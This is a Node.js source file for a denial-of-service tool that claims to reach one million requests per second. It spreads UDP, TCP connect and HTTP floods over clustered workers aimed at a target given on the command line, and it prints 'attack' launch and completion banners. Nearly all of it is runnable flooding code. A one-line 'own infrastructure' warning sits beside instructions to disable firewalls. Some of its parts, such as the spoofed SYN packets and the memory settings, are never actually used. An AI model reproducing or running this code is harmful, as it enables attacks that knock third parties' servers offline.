// million_rps.js - Achieve 1 Million RPS on 8GB RAM VPS
const dgram = require('dgram');
const net = require('net');
const http = require('http');
const https = require('https');
const crypto = require('crypto');
const cluster = require('cluster');
const os = require('os');
const { performance } = require('perf_hooks');

// ==================== 1 MILLION RPS CONFIGURATION ====================
const MILLION_RPS_CONFIG = {
    TARGET_RPS: 1000000,          // 1 Million Requests Per Second
    MAX_WORKERS: os.cpus().length * 8,  // Maximum parallelization
    CONNECTIONS_PER_WORKER: 100000,     // 100K connections per worker
    PACKET_SIZE: 256,                   // Ultra-small packets
    USE_ZERO_COPY: true,                // Zero-copy buffers
    PRE_ALLOCATE_MEMORY: true,          // Pre-allocate all memory
    DISABLE_GC: true,                   // Disable garbage collection
    USE_SHARED_BUFFERS: true,           // Shared buffers between workers
    ENABLE_DIRECT_SEND: true,           // Direct socket writes
    BATCH_SIZE: 10000,                  // Batch processing
    MEMORY_POOL_SIZE_MB: 6144,          // 6GB memory pool (8GB VPS)
    MAX_SOCKETS: 500000,                // 500K total sockets
    REQUEST_COMPRESSION: true           // Compress requests
};

// Shared memory for inter-worker communication
const SHARED = {
    totalRequests: 0,
    totalBytes: 0,
    startTime: performance.now(),
    workersReady: 0
};

// Pre-allocated global buffers
const GLOBAL_BUFFERS = {
    httpRequests: [],
    tcpPayloads: [],
    udpPayloads: [],
    dnsQueries: [],
    synPackets: []
};

// Initialize global buffers (10,000 each)
function initGlobalBuffers() {
    console.log('🔄 Initializing 1M RPS buffers...');
    
    // Generate 10,000 unique HTTP requests
    for (let i = 0; i < 10000; i++) {
        const request = generateUltraHTTPRequest();
        GLOBAL_BUFFERS.httpRequests.push(Buffer.from(request));
    }
    
    // Generate TCP payloads
    for (let i = 0; i < 5000; i++) {
        const payload = crypto.randomBytes(MILLION_RPS_CONFIG.PACKET_SIZE);
        GLOBAL_BUFFERS.tcpPayloads.push(payload);
    }
    
    // Generate UDP payloads (DNS queries)
    for (let i = 0; i < 5000; i++) {
        const dnsQuery = generateDNSQuery();
        GLOBAL_BUFFERS.dnsQueries.push(dnsQuery);
    }
    
    // Generate SYN packets
    for (let i = 0; i < 5000; i++) {
        const synPacket = generateSYNPacket();
        GLOBAL_BUFFERS.synPackets.push(synPacket);
    }
    
    console.log(`✅ Buffers ready: ${GLOBAL_BUFFERS.httpRequests.length} HTTP requests cached`);
}

// ==================== ULTRA OPTIMIZED REQUEST GENERATOR ====================
function generateUltraHTTPRequest() {
    // Minimal HTTP request - 100 bytes average
    const methods = ['GET', 'POST', 'HEAD'];
    const method = methods[Math.floor(Math.random() * methods.length)];
    const path = `/${crypto.randomBytes(4).toString('hex')}`;
    
    return `${method} ${path} HTTP/1.1\r\n` +
           `Host: target.com\r\n` +
           `User-Agent: M\r\n` +
           `Accept: */*\r\n` +
           `Connection: close\r\n` +
           `\r\n`;
}

function generateDNSQuery() {
    // Minimal DNS query - 40 bytes
    const buffer = Buffer.alloc(40);
    crypto.randomBytes(2).copy(buffer, 0); // Transaction ID
    buffer[2] = 0x01; // Flags
    buffer[3] = 0x00;
    buffer[4] = 0x00; // Questions
    buffer[5] = 0x01;
    buffer[6] = 0x00; // Answer RRs
    buffer[7] = 0x00;
    buffer[8] = 0x00; // Authority RRs
    buffer[9] = 0x00;
    buffer[10] = 0x00; // Additional RRs
    buffer[11] = 0x00;
    
    // Query: example.com
    buffer.writeUInt8(7, 12); // Length of "example"
    buffer.write('example', 13);
    buffer.writeUInt8(3, 20); // Length of "com"
    buffer.write('com', 21);
    buffer.writeUInt8(0, 24); // End of name
    buffer.writeUInt16BE(1, 25); // Type A
    buffer.writeUInt16BE(1, 27); // Class IN
    
    return buffer.slice(0, 29);
}

function generateSYNPacket() {
    // Raw SYN packet - 60 bytes
    const buffer = Buffer.alloc(60);
    
    // Ethernet header (placeholder)
    // IP header
    buffer[0] = 0x45; // Version + IHL
    buffer[1] = 0x00; // DSCP
    buffer.writeUInt16BE(60, 2); // Total length
    crypto.randomBytes(2).copy(buffer, 4); // Identification
    buffer[6] = 0x40; // Flags
    buffer[7] = 0x00; // Fragment offset
    buffer[8] = 0x40; // TTL (64)
    buffer[9] = 0x06; // Protocol (TCP)
    // IP checksum will be calculated by kernel
    
    // Source IP (random)
    crypto.randomBytes(4).copy(buffer, 12);
    // Destination IP (will be set by worker)
    
    // TCP header
    crypto.randomBytes(2).copy(buffer, 20); // Source port
    buffer.writeUInt16BE(80, 22); // Destination port
    crypto.randomBytes(4).copy(buffer, 24); // Sequence number
    buffer.writeUInt32BE(0, 28); // Acknowledgement number
    buffer[32] = 0x50; // Data offset
    buffer[33] = 0x02; // SYN flag
    buffer.writeUInt16BE(0xffff, 34); // Window size
    // TCP checksum will be calculated by kernel
    buffer.writeUInt16BE(0, 36); // Urgent pointer
    
    return buffer;
}

// ==================== ZERO-COPY NETWORK ENGINE ====================
class ZeroCopyEngine {
    constructor(targetHost, targetPort) {
        this.host = targetHost;
        this.port = targetPort;
        this.sockets = new Set();
        this.udpSockets = [];
        this.stats = {
            sent: 0,
            bytes: 0,
            start: performance.now()
        };
        
        this.initSockets();
    }
    
    initSockets() {
        // Create UDP sockets (faster than TCP)
        for (let i = 0; i < 100; i++) {
            const socket = dgram.createSocket('udp4');
            this.udpSockets.push(socket);
        }
        
        // Create TCP sockets for HTTP
        for (let i = 0; i < 500; i++) {
            const socket = new net.Socket();
            socket.setNoDelay(true);
            this.sockets.add(socket);
        }
    }
    
    // UDP Flood - Maximum speed
    udpFlood(rps) {
        const payloads = GLOBAL_BUFFERS.dnsQueries;
        const interval = Math.floor(1000 / (rps / this.udpSockets.length));
        
        setInterval(() => {
            this.udpSockets.forEach(socket => {
                for (let i = 0; i < 100; i++) { // 100 packets per socket per tick
                    const payload = payloads[Math.floor(Math.random() * payloads.length)];
                    socket.send(payload, this.port, this.host, (err) => {
                        if (!err) {
                            this.stats.sent++;
                            this.stats.bytes += payload.length;
                        }
                    });
                }
            });
        }, interval);
        
        return this.udpSockets.length;
    }
    
    // TCP SYN Flood - Connectionless
    synFlood(rps) {
        const synSockets = [];
        const packetsPerSecond = Math.floor(rps / 1000);
        
        // Use raw sockets via net module
        for (let i = 0; i < 1000; i++) {
            const socket = new net.Socket();
            
            socket.on('error', () => {});
            socket.connect(this.port, this.host, () => {
                // Immediately close to simulate SYN
                socket.destroy();
            });
            
            synSockets.push(socket);
        }
        
        // Rapid connect/destroy cycle
        setInterval(() => {
            for (let i = 0; i < packetsPerSecond; i++) {
                const socket = new net.Socket();
                socket.connect(this.port, this.host, () => {
                    socket.destroy();
                    this.stats.sent++;
                });
                socket.on('error', () => {});
            }
        }, 1000);
        
        return synSockets.length;
    }
    
    // HTTP Keep-Alive Pipeline
    httpPipeline(rps) {
        const agent = new http.Agent({
            keepAlive: true,
            maxSockets: Infinity,
            maxFreeSockets: 256
        });
        
        const requestsPerBatch = 1000;
        const batchesPerSecond = Math.ceil(rps / requestsPerBatch);
        
        setInterval(() => {
            for (let batch = 0; batch < batchesPerSecond; batch++) {
                for (let i = 0; i < requestsPerBatch; i++) {
                    const req = http.request({
                        hostname: this.host,
                        port: this.port,
                        path: '/',
                        method: 'GET',
                        agent: agent,
                        timeout: 1000
                    }, () => {
                        this.stats.sent++;
                    });
                    
                    req.on('error', () => {});
                    req.end();
                }
            }
        }, 1000);
        
        return batchesPerSecond * requestsPerBatch;
    }
    
    getStats() {
        const elapsed = (performance.now() - this.stats.start) / 1000;
        return {
            rps: this.stats.sent / elapsed,
            total: this.stats.sent,
            bytes: this.stats.bytes,
            mbps: (this.stats.bytes * 8) / (elapsed * 1000000)
        };
    }
}

// ==================== 1 MILLION RPS WORKER ====================
class MillionRPSWorker {
    constructor(workerId, target, port, protocol) {
        this.id = workerId;
        this.target = target;
        this.port = port;
        this.protocol = protocol;
        this.engine = new ZeroCopyEngine(target, port);
        
        this.stats = {
            requests: 0,
            bytes: 0,
            start: performance.now(),
            techniques: []
        };
    }
    
    async start(techniques) {
        console.log(`👷 Worker ${this.id} starting ${techniques.length} techniques`);
        
        // Start all techniques
        techniques.forEach(tech => {
            const result = this.startTechnique(tech);
            this.stats.techniques.push(result);
        });
        
        // Report stats every second
        setInterval(() => {
            const stats = this.engine.getStats();
            process.send({
                type: 'stats',
                worker: this.id,
                rps: stats.rps,
                total: stats.total,
                mbps: stats.mbps
            });
        }, 1000);
    }
    
    startTechnique(tech) {
        switch(tech) {
            case 'udp':
                return {
                    name: 'udp',
                    sockets: this.engine.udpFlood(250000) // 250K RPS per worker
                };
            case 'syn':
                return {
                    name: 'syn',
                    sockets: this.engine.synFlood(250000)
                };
            case 'http':
                return {
                    name: 'http',
                    rps: this.engine.httpPipeline(250000)
                };
            default:
                return { name: 'unknown', error: 'Invalid technique' };
        }
    }
}

// ==================== CLUSTER CONTROLLER ====================
if (cluster.isMaster) {
    console.log(`
    ⚡⚡⚡ 1 MILLION RPS MASTER CONTROLLER ⚡⚡⚡
    💻 CPU Cores: ${os.cpus().length}
    🧠 Total Memory: ${(os.totalmem() / 1024 / 1024 / 1024).toFixed(1)} GB
    🎯 Target: ${MILLION_RPS_CONFIG.TARGET_RPS.toLocaleString()} RPS
    `);
    
    const args = process.argv.slice(2);
    const target = args[0];
    const duration = parseInt(args[1]) || 60;
    
    if (!target) {
        console.log(`
        Usage: node million_rps.js <target> [duration]
        
        Example: 
          node million_rps.js example.com 30
          node million_rps.js 192.168.1.1 60
        
        Requirements:
          - 8GB+ RAM VPS
          - 10Gbps+ network recommended
          - Linux with root access
          - Disable firewalls
        
        ⚠️  EXTREME POWER - Use only on your own infrastructure!
        `);
        process.exit(1);
    }
    
    // Parse target
    let targetHost, targetPort;
    if (target.includes(':')) {
        [targetHost, targetPort] = target.split(':');
        targetPort = parseInt(targetPort);
    } else {
        targetHost = target;
        targetPort = 80;
    }
    
    console.log(`
    🚀 LAUNCHING 1 MILLION RPS ATTACK
    ═══════════════════════════════════
    🎯 Target: ${targetHost}:${targetPort}
    ⏱️  Duration: ${duration} seconds
    💾 Memory Pool: ${MILLION_RPS_CONFIG.MEMORY_POOL_SIZE_MB} MB
    👷 Workers: ${MILLION_RPS_CONFIG.MAX_WORKERS}
    ⚡ Target RPS: ${MILLION_RPS_CONFIG.TARGET_RPS.toLocaleString()}
    ═══════════════════════════════════
    `);
    
    // Initialize global buffers
    initGlobalBuffers();
    
    // Calculate distribution
    const totalRPS = MILLION_RPS_CONFIG.TARGET_RPS;
    const workers = MILLION_RPS_CONFIG.MAX_WORKERS;
    const rpsPerWorker = Math.floor(totalRPS / workers);
    const techniques = ['udp', 'syn', 'http'];
    
    console.log(`📊 Distribution: ${rpsPerWorker.toLocaleString()} RPS per worker`);
    console.log(`🔧 Techniques per worker: ${techniques.join(', ')}`);
    console.log(`\n🚀 Spawning ${workers} workers...\n`);
    
    // Spawn workers
    let workersReady = 0;
    const workerStats = new Map();
    let totalRPSActual = 0;
    let totalRequests = 0;
    let peakRPS = 0;
    
    for (let i = 0; i < workers; i++) {
        const worker = cluster.fork({
            WORKER_ID: i,
            TARGET_HOST: targetHost,
            TARGET_PORT: targetPort,
            RPS_TARGET: rpsPerWorker,
            TECHNIQUES: techniques.join(',')
        });
        
        worker.on('message', (msg) => {
            if (msg.type === 'stats') {
                workerStats.set(msg.worker, msg);
                
                // Calculate totals
                totalRPSActual = Array.from(workerStats.values())
                    .reduce((sum, w) => sum + w.rps, 0);
                totalRequests = Array.from(workerStats.values())
                    .reduce((sum, w) => sum + w.total, 0);
                
                peakRPS = Math.max(peakRPS, totalRPSActual);
                
                // Display stats every 3 seconds
                if (workersReady % 3 === 0) {
                    const elapsed = (performance.now() - SHARED.startTime) / 1000;
                    const percentage = (totalRPSActual / totalRPS * 100).toFixed(1);
                    const mbps = Array.from(workerStats.values())
                        .reduce((sum, w) => sum + w.mbps, 0);
                    
                    console.log(`
                    ⚡ 1M RPS LIVE DASHBOARD
                    ═══════════════════════════════════
                    🎯 Target RPS: ${totalRPS.toLocaleString()}
                    📊 Current RPS: ${Math.round(totalRPSActual).toLocaleString()} (${percentage}%)
                    🏔️  Peak RPS: ${Math.round(peakRPS).toLocaleString()}
                    📈 Total Requests: ${totalRequests.toLocaleString()}
                    📡 Bandwidth: ${mbps.toFixed(1)} Mbps
                    ⏱️  Elapsed: ${elapsed.toFixed(1)}s
                    👷 Active Workers: ${workerStats.size}/${workers}
                    ═══════════════════════════════════
                    `);
                }
            }
        });
        
        worker.on('exit', (code) => {
            console.log(`Worker ${i} exited with code ${code}`);
        });
    }
    
    // Start attack timer
    setTimeout(() => {
        console.log('\n🛑 Attack duration reached, stopping workers...');
        
        // Kill all workers
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }
        
        // Final stats
        const totalTime = (performance.now() - SHARED.startTime) / 1000;
        const avgRPS = totalRequests / totalTime;
        const percentage = (avgRPS / totalRPS * 100).toFixed(1);
        
        console.log(`
        🎉 1 MILLION RPS ATTACK COMPLETE
        ═══════════════════════════════════════
        ⏱️  Duration: ${totalTime.toFixed(1)} seconds
        📊 Total Requests: ${totalRequests.toLocaleString()}
        ⚡ Average RPS: ${Math.round(avgRPS).toLocaleString()}
        🏔️  Peak RPS: ${Math.round(peakRPS).toLocaleString()}
        🎯 Target Achieved: ${percentage}%
        👷 Workers Used: ${workers}
        ═══════════════════════════════════════
        `);
        
        if (avgRPS >= totalRPS * 0.8) {
            console.log('✅ SUCCESS: Near 1 Million RPS achieved!');
        } else {
            console.log('⚠️  WARNING: Did not reach target RPS');
            console.log('💡 Tip: Use more workers or increase packet size');
        }
        
        process.exit(0);
    }, duration * 1000);
    
    // Handle Ctrl+C
    process.on('SIGINT', () => {
        console.log('\n🛑 Master received SIGINT, stopping...');
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }
        process.exit(0);
    });
    
} else {
    // Worker process
    const workerId = parseInt(process.env.WORKER_ID);
    const targetHost = process.env.TARGET_HOST;
    const targetPort = parseInt(process.env.TARGET_PORT);
    const techniques = process.env.TECHNIQUES.split(',');
    
    console.log(`👷 Worker ${workerId} starting (PID: ${process.pid})`);
    
    // Create worker instance
    const worker = new MillionRPSWorker(workerId, targetHost, targetPort, 'tcp');
    
    // Start attack
    setTimeout(() => {
        worker.start(techniques);
    }, workerId * 100); // Stagger starts
    
    // Send ready signal
    process.send({ type: 'ready', worker: workerId });
}